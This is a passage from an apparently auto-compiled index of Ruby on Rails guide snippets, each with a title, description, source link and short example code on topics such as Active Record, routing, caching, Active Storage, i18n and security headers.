method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nirb> user = User.new(name: \"John Doe\", age: 17, email: \"jane@example.com\", phone: \"1234567890\", address: \"123 Main St\")\nirb> user.save(context: :personal_info) # => false\nirb> user.save(context: :contact_info) # => true\nirb> user.save(context: :location_info) # => false\n```\n\n----------------------------------------\n\nTITLE: Using Composite Primary Keys with query_constraints\nDESCRIPTION: Example of implementing virtual composite primary keys using the query_constraints macro in ActiveRecord models, useful for complex data models where a single column is insufficient for unique identification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass TravelRoute < ActiveRecord::Base\n  query_constraints :origin, :destination\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache-Control Headers in Ruby on Rails\nDESCRIPTION: Setting up Cache-Control headers in Rails to optimize CDN and browser caching. This configuration sets public assets to be cached for one year (31536000 seconds), improving performance and reducing server load.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.public_file_server.headers = {\n  \"Cache-Control\" => \"public, max-age=31536000\"\n}\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition with Through Association\nDESCRIPTION: Defines the Supplier model with has_many associations to Book models and Author models through the books association. This demonstrates the use of a through association to define a many-to-many relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_many :books\n  has_many :authors, through: :books\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring has_one_attached with Service Option (Ruby)\nDESCRIPTION: Configures Active Storage attachment to use a specific storage service (e.g., :google) for a given association via the service option. Useful for overriding the default storage backend on a per-attachment basis.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :avatar, service: :google\nend\n```\n\n----------------------------------------\n\nTITLE: Switching Locale in Application Controller - Ruby\nDESCRIPTION: This code adds an `around_action` to the `ApplicationController` to switch the locale for each request based on the `locale` parameter in the URL or the default locale. It uses `I18n.with_locale` to set the locale for the duration of the action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  # ...\n\n  around_action :switch_locale\n\n  def switch_locale(&action)\n    locale = params[:locale] || I18n.default_locale\n    I18n.with_locale(locale, &action)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using `try` for Safe Method Calls\nDESCRIPTION: This example shows how to use the `try` method to safely call a method on an object that might be `nil`. It prevents `NoMethodError` exceptions by returning `nil` if the object is `nil`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# without try\nunless @number.nil?\n  @number.next\nend\n\n# with try\n@number.try(:next)\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef log_info(sql, name, ms)\n  if @logger.try(:debug?)\n    name = \"%s (%.1fms)\" % [name || \"SQL\", ms]\n    @logger.debug(format_log_entry(name, sql.squeeze(\" \")))\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@person.try { |p| \"#{p.first_name} #{p.last_name}\" }\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@number.try(:nest)  # => nil\n@number.try!(:nest) # NoMethodError: undefined method `nest' for 1:Integer\n```\n\n----------------------------------------\n\nTITLE: Disabling Content-Security-Policy in a Rails Controller\nDESCRIPTION: This snippet shows how to disable the Content-Security-Policy for a specific action in a Rails controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nclass LegacyPagesController < ApplicationController\n  content_security_policy false, only: :index\nend\n```\n\n----------------------------------------\n\nTITLE: Russian Doll Caching: Inner Fragment with ERB\nDESCRIPTION: An example of the inner fragment in Russian Doll caching. This fragment caches the rendering of a game.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_5\n\nLANGUAGE: erb\nCODE:\n```\n<% cache game do %>\n  <%= render game %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Removing Attachments Asynchronously in Rails\nDESCRIPTION: Demonstrates how to asynchronously remove an attachment using Active Job by calling the purge_later method, which performs the deletion in the background.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n# Destroy the associated models and actual resource files async, via Active Job.\nuser.avatar.purge_later\n```\n\n----------------------------------------\n\nTITLE: Registering Email Observer in Ruby on Rails Configuration\nDESCRIPTION: This snippet shows how to register an email observer in a Rails application's configuration. It sets up the observer to be active for all environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.configure do\n  config.action_mailer.observers = %w[EmailDeliveryObserver]\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a New Product Instance in Rails\nDESCRIPTION: This snippet demonstrates how to create a new instance of the `Product` model using the `new` method. It then attempts to save the instance without providing a name, which will trigger the presence validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_32\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.new\nstore(dev)> product.save\n=> false\n```\n\n----------------------------------------\n\nTITLE: Implementing ActiveSupport::Concern in Engine Models\nDESCRIPTION: Demonstrates using ActiveSupport::Concern to modularize and manage complex class modifications in engine models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\n# MyApp/app/models/blorgh/article.rb\n\nclass Blorgh::Article < ApplicationRecord\n  include Blorgh::Concerns::Models::Article\n\n  def time_since_created\n    Time.current - created_at\n  end\n\n  def summary\n    \"#{title} - #{truncate(text)}\"\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Blorgh/app/models/blorgh/article.rb\nmodule Blorgh\n  class Article < ApplicationRecord\n    include Blorgh::Concerns::Models::Article\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Blorgh/lib/concerns/models/article.rb\n\nmodule Blorgh::Concerns::Models::Article\n  extend ActiveSupport::Concern\n\n  included do\n    attr_accessor :author_name\n    belongs_to :author, class_name: \"User\"\n\n    before_validation :set_author\n\n    private\n      def set_author\n        self.author = User.find_or_create_by(name: author_name)\n      end\n  end\n\n  def summary\n    \"#{title}\"\n  end\n\n  module ClassMethods\n    def some_class_method\n      \"some class method string\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Specifying Controller Layout in Rails\nDESCRIPTION: This snippet shows how to override the default layout conventions by using the `layout` declaration in a controller.  All views rendered by the controller will then use the specified layout.  It also provides an example for setting the layout for the entire application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  layout \"inventory\"\n  #...\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  layout \"main\"\n  #...\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Allowed Hosts in Rails\nDESCRIPTION: This example demonstrates how to configure allowed hosts in a Rails application using `Rails.application.config.hosts`. This is to prevent against DNS rebinding and other `Host` header attacks, especially in production environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.hosts = [\n  IPAddr.new(\"0.0.0.0/0\"),        # All IPv4 addresses.\n  IPAddr.new(\"::/0\"),             # All IPv6 addresses.\n  \"localhost\",                    # The localhost reserved domain.\n  ENV[\"RAILS_DEVELOPMENT_HOSTS\"]  # Additional comma-separated hosts for development.\n]\n```\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.hosts << \"product.com\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Allow requests from subdomains like `www.product.com` and\n# `beta1.product.com`.\nRails.application.config.hosts << /.*\\.product\\.com/\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Allow requests from subdomains like `www.product.com` and\n# `beta1.product.com`.\nRails.application.config.hosts << \".product.com\"\n```\n\n----------------------------------------\n\nTITLE: Routing with Controller Namespaces in Rails\nDESCRIPTION: This snippet shows how to group controllers under a namespace using the `namespace` block in Rails. This helps organize controllers in larger applications and creates routes with a specific prefix, such as `/admin` for controllers under the `Admin::` namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nnamespace :admin do\n  resources :articles\nend\n```\n\n----------------------------------------\n\nTITLE: Using web-console in a Controller\nDESCRIPTION: Shows how to use the web-console gem to launch a debugging console from a controller action. The console method renders an interactive Ruby console in the browser alongside the view, allowing runtime inspection and debugging.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  def new\n    console\n    @post = Post.new\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Advanced Constraints - Lambda (Ruby)\nDESCRIPTION: Defines a constraint using a lambda function. The lambda checks if the request's remote IP is on a restricted list, routing to `RestrictedListController` if it is.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  get \"*path\", to: \"restricted_list#index\",\n    constraints: lambda { |request| RestrictedList.retrieve_ips.include?(request.remote_ip) }\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Solid Cache Store in production.rb\nDESCRIPTION: This snippet demonstrates how to configure the cache store to use Solid Cache in the `config/environments/production.rb` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\n  # config/environments/production.rb\n  config.cache_store = :solid_cache_store\n```\n\n----------------------------------------\n\nTITLE: Setting I18n Locale for Active Job (Ruby)\nDESCRIPTION: This snippet illustrates how to set the `I18n.locale` before enqueuing a job, ensuring that the job executes with the specified locale. This is particularly useful for sending localized emails asynchronously, as shown in the example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.locale = :eo\n\nUserMailer.welcome(@user).deliver_later # Email will be localized to Esperanto.\n```\n\n----------------------------------------\n\nTITLE: Multiple JavaScript Includes (Rails/ERB)\nDESCRIPTION: This example demonstrates including multiple javascript files (`main.js` and `columns.js`) using the `javascript_include_tag` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_44\n\nLANGUAGE: erb\nCODE:\n```\n<%= javascript_include_tag \"main\", \"columns\" %>\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for HAVING Conditions in Rails\nDESCRIPTION: The SQL query generated when using the `having` method includes a `HAVING` clause, which filters the grouped results based on the sum of totals.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_98\n\nLANGUAGE: sql\nCODE:\n```\nSELECT created_at as ordered_date, sum(total) as total_price\nFROM orders\nGROUP BY created_at\nHAVING sum(total) > 200\n```\n\n----------------------------------------\n\nTITLE: Find Customers by IDs (Multiple)\nDESCRIPTION: Retrieves multiple Customer records from the database using the `find` method with an array of primary keys. The method raises an `ActiveRecord::RecordNotFound` exception if a matching record is not found for **all** of the supplied primary keys. This demonstrates how to fetch multiple records at once.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the customers with primary keys 1 and 10.\nirb> customers = Customer.find([1, 10]) # OR Customer.find(1, 10)\n=> [#<Customer id: 1, first_name: \"Lifo\">, #<Customer id: 10, first_name: \"Ryan\">]\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of take with limit\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.take(2)` method in Rails. It selects all columns from the `customers` table and limits the result to 2 records, effectively fetching two rows without any specific order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers LIMIT 2\n```\n\n----------------------------------------\n\nTITLE: Action Cable Chat Channel Example in Ruby\nDESCRIPTION: This is an example of a custom channel class, `ChatChannel`, which inherits from `ApplicationCable::Channel`.  This example illustrates the basic structure of a simple Action Cable channel.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\nend\n```\n\n----------------------------------------\n\nTITLE: Inheriting from Main Application's Controller\nDESCRIPTION: Ruby code to make the engine's ApplicationController inherit from the main application's ApplicationController, allowing shared functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class ApplicationController < ::ApplicationController\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Retrieving the last record with order\nDESCRIPTION: This code shows how to retrieve the last record with a custom ordering specified using the `order` method. The records are ordered by the `first_name` column in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_32\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.order(:first_name).last\n=> #<Customer id: 220, first_name: \"Sara\">\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Service in Models\nDESCRIPTION: Demonstrates how to specify a service when defining an Active Storage attachment in a model using the service option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :avatar, service: :s3\nend\n```\n\n----------------------------------------\n\nTITLE: Running Plugin Tests - Ruby Test Runner - Bash\nDESCRIPTION: Executes plugin test suites using the bin/test command. Tests validate the initial project setup and later the correctness of your code. Relies on the test suite being defined within the plugin and a Bash environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/test\n...\n1 runs, 1 assertions, 0 failures, 0 errors, 0 skips\n```\n\n----------------------------------------\n\nTITLE: Selecting Specific Fields in Rails\nDESCRIPTION: Shows how to use the `select` method to retrieve only specific columns from the database.  Shows both symbol and string syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_84\n\nLANGUAGE: ruby\nCODE:\n```\nBook.select(:isbn, :out_of_print)\n# OR\nBook.select(\"isbn, out_of_print\")\n```\n\n----------------------------------------\n\nTITLE: Enabling Parallel Testing with Processes\nDESCRIPTION: This code snippet shows how to enable parallel testing using forked processes in `test_helper.rb`. It sets the number of workers and includes setup/teardown hooks for managing databases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_112\n\nLANGUAGE: ruby\nCODE:\n```\nclass ActiveSupport::TestCase\n  parallelize_setup do |worker|\n    # setup databases\n  end\n\n  parallelize_teardown do |worker|\n    # cleanup databases\n  end\n\n  parallelize(workers: :number_of_processors)\nend\n```\n\n----------------------------------------\n\nTITLE: Pessimistic Locking with Custom SQL (Ruby)\nDESCRIPTION: This snippet demonstrates how to pass raw SQL to the `lock` method to allow different types of locks. In this case, it uses `LOCK IN SHARE MODE` in MySQL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_135\n\nLANGUAGE: ruby\nCODE:\n```\nBook.transaction do\n  book = Book.lock(\"LOCK IN SHARE MODE\").find(1)\n  book.increment!(:views)\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Member Route to Resources - Ruby\nDESCRIPTION: This snippet demonstrates how to add a member route to the `photos` resource. It adds a `preview` action that operates on a single photo. The generated route is `/photos/1/preview`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos do\n  member do\n    get \"preview\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Product Partial (_product.html.erb)\nDESCRIPTION: This code snippet represents a product partial that displays the name of the product. It expects a local variable named `product` which is an instance of the Product model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_85\n\nLANGUAGE: html+erb\nCODE:\n```\n<p>Product Name: <%= product.name %></p>\n```\n\n----------------------------------------\n\nTITLE: Find Record by Identifier in Rails\nDESCRIPTION: Demonstrates how to find a record using the renamed identifier parameter. It replaces `params[:id]` with `params[:identifier]` when querying the database. `Video.find_by` example is given.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\nVideo.find_by(id: params[:identifier])\n\n# Instead of\nVideo.find_by(id: params[:id])\n```\n\n----------------------------------------\n\nTITLE: Creating and Using UUID Fields in Rails\nDESCRIPTION: Demonstrates how to create and use UUID fields in Rails models, including table creation and model definition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_revisions.rb\ncreate_table :revisions do |t|\n  t.uuid :identifier\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/revision.rb\nclass Revision < ApplicationRecord\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Revision.create identifier: \"A0EEBC99-9C0B-4EF8-BB6D-6BB9BD380A11\"\n\nirb> revision = Revision.first\nirb> revision.identifier\n=> \"a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Error Object Properties in Rails\nDESCRIPTION: This snippet demonstrates how to access properties of an error object, including attribute, type, and options. It shows how to retrieve various aspects of an error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\nirb> error = person.errors.where(:name).last\n\nirb> error.attribute\n=> :name\nirb> error.type\n=> :too_short\nirb> error.options[:count]\n=> 3\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Polymorphic Associations (Ruby)\nDESCRIPTION: This code snippet shows how to create a `taggings` table with a polymorphic association to support tagging different types of models, using `taggable_id` and `taggable_type` columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_29\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :taggings do |t|\n  t.references :taggable, polymorphic: true\nend\n```\n\n----------------------------------------\n\nTITLE: Using Logger Methods in Rails Applications\nDESCRIPTION: Demonstrates how to write messages to the current log using various logger methods with different severity levels.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nlogger.debug \"Person attributes hash: #{@person.attributes.inspect}\"\nlogger.info \"Processing the request...\"\nlogger.fatal \"Terminating application, raised unrecoverable error!!!\"\n```\n\n----------------------------------------\n\nTITLE: Rails enum bang method\nDESCRIPTION: This snippet shows how to use the bang methods that are created with an enum declaration. It updates the value of the enum and then queries whether the status has been successfully set to the value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_179\n\nLANGUAGE: ruby\nCODE:\n```\norder = Order.first\norder.shipped!\n```\n\n----------------------------------------\n\nTITLE: Setting Locale from User Preferences in Ruby on Rails\nDESCRIPTION: Implements locale switching based on the authenticated user's preferences. It uses an around_action to set the locale for each request based on the current user's stored locale preference.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\naround_action :switch_locale\n\ndef switch_locale(&action)\n  locale = current_user.try(:locale) || I18n.default_locale\n  I18n.with_locale(locale, &action)\nend\n```\n\n----------------------------------------\n\nTITLE: Segment Constraints with Regular Expression (Ruby)\nDESCRIPTION: Constrains the `id` segment of the `/photos/:id` route to match a specific regular expression (alphanumeric characters with specific length requirements). This enforces a format for the dynamic segment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/:id\", to: \"photos#show\", constraints: { id: /[A-Z]\\d{5}/ }\n```\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/:id\", to: \"photos#show\", id: /[A-Z]\\d{5}/\n```\n\n----------------------------------------\n\nTITLE: Adding and Subtracting Durations from Dates in Ruby\nDESCRIPTION: Duration objects can be added to and subtracted from dates using the `+` and `-` operators.  These operations translate to calls to `since` or `advance`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_154\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.current\n# => Mon, 09 Aug 2010\nd + 1.year\n# => Tue, 09 Aug 2011\nd - 3.hours\n# => Sun, 08 Aug 2010 21:00:00 UTC +00:00\n```\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(1582, 10, 4) + 1.day\n# => Fri, 15 Oct 1582\n```\n\n----------------------------------------\n\nTITLE: Example Rails routes configuration\nDESCRIPTION: This code block provides an example of a typical `config/routes.rb` file in a Rails application. It demonstrates the use of `resources`, `resource`, and `resolve` for defining routes. The `resources` method creates multiple routes for a resource, while `resource` creates a single route for a singleton resource. The `resolve` method defines a custom route resolver.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  resources :brands, only: [:index, :show] do\n    resources :products, only: [:index, :show]\n  end\n\n  resource :basket, only: [:show, :update, :destroy]\n\n  resolve(\"Basket\") { route_for(:basket) }\nend\n```\n\n----------------------------------------\n\nTITLE: Registering Email Interceptor in Ruby on Rails Configuration\nDESCRIPTION: This snippet shows how to register an email interceptor in a Rails application's configuration. It's set up to only intercept emails in the staging environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.configure do\n  if Rails.env.staging?\n    config.action_mailer.interceptors = %w[SandboxEmailInterceptor]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Mailto Links with mail_to Helper in Ruby\nDESCRIPTION: Demonstrates the `mail_to` helper in Rails Action View. It generates an HTML `<a>` tag with a `mailto:` link. The first example shows a basic link, while the second includes `cc` and `subject` parameters, which are URL-encoded.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nmail_to \"john_doe@gmail.com\"\n# => <a href=\"mailto:john_doe@gmail.com\">john_doe@gmail.com</a>\n```\n\nLANGUAGE: ruby\nCODE:\n```\nmail_to \"me@john_doe.com\", cc: \"me@jane_doe.com\",\n        subject: \"This is an example email\"\n# => <a href=\"mailto:\"me@john_doe.com?cc=me@jane_doe.com&subject=This%20is%20an%20example%20email\">\"me@john_doe.com</a>\n```\n\n----------------------------------------\n\nTITLE: Initializing the Rackup Server Base Class (Ruby)\nDESCRIPTION: This is the initializer (`initialize`) for the base `Rackup::Server` class in `lib/rackup/server.rb`. It sets up instance variables based on the provided `options` hash. If options are given (as is the case when called from `Rails::Server`), it uses them directly, setting `@options` and potentially `@app`. If no options are passed, it defaults to parsing command-line arguments (ARGV) to determine the configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    def initialize(options = nil)\n      @ignore_options = []\n\n      if options\n        @use_default_options = false\n        @options = options\n        @app = options[:app] if options[:app]\n      else\n        @use_default_options = true\n        @options = parse_options(ARGV)\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Strict-Transport-Security Header in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to enable the Strict-Transport-Security (HSTS) header by setting the force_ssl option to true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.force_ssl = true\n```\n\n----------------------------------------\n\nTITLE: Rendering a Different View\nDESCRIPTION: Demonstrates rendering a specific view (edit.html.erb) from the update action when the book update fails.  Uses `redirect_to` on success and `render` to show the edit form again on failure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\ndef update\n  @book = Book.find(params[:id])\n  if @book.update(book_params)\n    redirect_to(@book)\n  else\n    render \"edit\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Direct Route with Hash Argument in Rails\nDESCRIPTION: This example creates a direct route called `main` that constructs a URL using a hash of parameters. The resulting URL will be based on the controller, action, and subdomain specified in the hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\ndirect :main do\n  { controller: \"pages\", action: \"index\", subdomain: \"www\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic Rails Controller (Ruby on Rails, Ruby)\nDESCRIPTION: This Ruby class defines a controller in Rails, inheriting from ApplicationController. The controller defines a 'hello' action, which initializes an instance variable '@message' that will be available for the associated view. This code is a minimal controller setup and doesn't require dependencies beyond a working Rails application. Expected input: HTTP GET request to '/greetings/hello'. Output: Renders the 'hello' view, making '@message' accessible in that view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nclass GreetingsController < ApplicationController\\n  def hello\\n    @message = \\\"Hello, how are you today?\\\"\\n  end\\nend\n```\n\n----------------------------------------\n\nTITLE: Shorthand form_with with Record Identification\nDESCRIPTION: This snippet demonstrates the shorthand way of using form_with with record identification in Ruby and ERB. Both the longer and shorter versions generate the same HTML.  Requires routes declared with resources :articles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n# longer way:\nform_with(model: @article, url: articles_path)\n# short-hand:\nform_with(model: @article)\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for AND Condition in Rails\nDESCRIPTION: SQL generated by chaining where clauses, demonstrating the AND operator. This combines the conditions for 'last_name' and 'orders_count'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_76\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE customers.last_name = 'Smith' AND customers.orders_count IN (1,3,5)\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Migration via Command Line\nDESCRIPTION: Command line instruction to generate a Rails migration for creating the books table with title and author string columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration CreateBooks title:string author:string\n```\n\n----------------------------------------\n\nTITLE: Overriding the start Method in Rails::Server - Ruby\nDESCRIPTION: This Ruby code snippet shows how Rails::Server inherits from Rack::Server and overrides the start method. By calling super, it ensures the parent Rack::Server#start behavior is invoked. This is a key place where Rails can extend or hook into server startup logic. Requires the rack and rails gems and should be used within Rails server class definitions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass Server < ::Rack::Server\\n  def start\\n    # ...\\n    super\\n  end\\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Dates with distance_of_time_in_words in Ruby\nDESCRIPTION: Uses the distance_of_time_in_words helper to report the approximate distance in time between two Time or Date objects. It can include seconds for more detailed approximations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\ndistance_of_time_in_words(Time.current, 15.seconds.from_now)\n# => less than a minute\ndistance_of_time_in_words(Time.current, 15.seconds.from_now, include_seconds: true)\n# => less than 20 seconds\n```\n\n----------------------------------------\n\nTITLE: Asking Questions with ask\nDESCRIPTION: Demonstrates how to get user feedback using the `ask` method and use it in the template. The example asks the user for the name of a library and creates the library file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nlib_name = ask(\"What do you want to call the shiny library ?\")\nlib_name << \".rb\" unless lib_name.index(\".rb\")\n\nlib lib_name, <<-CODE\n  class Shiny\n  end\nCODE\n```\n\n----------------------------------------\n\nTITLE: Implementing Presence Validation in Ruby on Rails Model\nDESCRIPTION: This Ruby code snippet shows how to implement a presence validation for the 'name' attribute in a User model using Active Record validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of first\nDESCRIPTION: This SQL query shows the equivalent SQL command for the 